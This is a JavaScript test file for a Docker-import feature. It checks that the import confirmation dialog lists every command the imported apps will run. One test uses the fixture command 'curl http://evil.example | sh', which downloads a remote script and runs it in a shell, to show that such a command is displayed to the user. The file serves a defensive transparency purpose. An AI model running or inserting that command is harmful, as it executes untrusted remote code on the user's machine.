// Copyright (C) 2026  oito2
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <https://www.gnu.org/licenses/>.

import { test } from "node:test";
import assert from "node:assert/strict";
import { loadScripts, scriptOrder } from "./harness.mjs";

const tick = () => new Promise((r) => setTimeout(r, 0));

function load(preview) {
  return loadScripts(scriptOrder(), {
    fixtures: { PickImportConfigPath: "/tmp/docker-export.yaml", PreviewImportConfig: preview },
  });
}

test("importPreviewMessage lists every command the apps will run", () => {
  const { ctx } = load({});
  const msg = ctx.importPreviewMessage({
    workspacePath: "/ws", hasNginx: true, hasMariaDb: false, appsCount: 2,
    commands: ["spa: npm run dev", "api (worker): php artisan queue:work"],
  });
  assert.match(msg, /Workspace: \/ws/);
  assert.match(msg, /Apps: 2/);
  assert.match(msg, /• spa: npm run dev/);
  assert.match(msg, /• api \(worker\): php artisan queue:work/);
  assert.match(msg, /Continuar\?$/);
});

test("importPreviewMessage omits the command section when there are none", () => {
  const { ctx } = load({});
  for (const commands of [[], undefined]) {
    const msg = ctx.importPreviewMessage({ workspacePath: "", hasNginx: false, hasMariaDb: false, appsCount: 0, commands });
    assert.doesNotMatch(msg, /Comandos/);
    assert.match(msg, /\(nenhum\)/);
  }
});

test("the import button confirms with the commands from the preview", async () => {
  const preview = {
    workspacePath: "/ws", hasNginx: false, hasMariaDb: false, appsCount: 1,
    commands: ["spa: curl http://evil.example | sh"],
  };
  const { element } = load(preview);
  const confirmMessage = element("confirm-modal-message");
  const click = element("btn-docker-import").listeners.click[0];
  click();
  await tick();
  await tick();
  assert.match(confirmMessage.textContent, /• spa: curl http:\/\/evil\.example \| sh/);
});
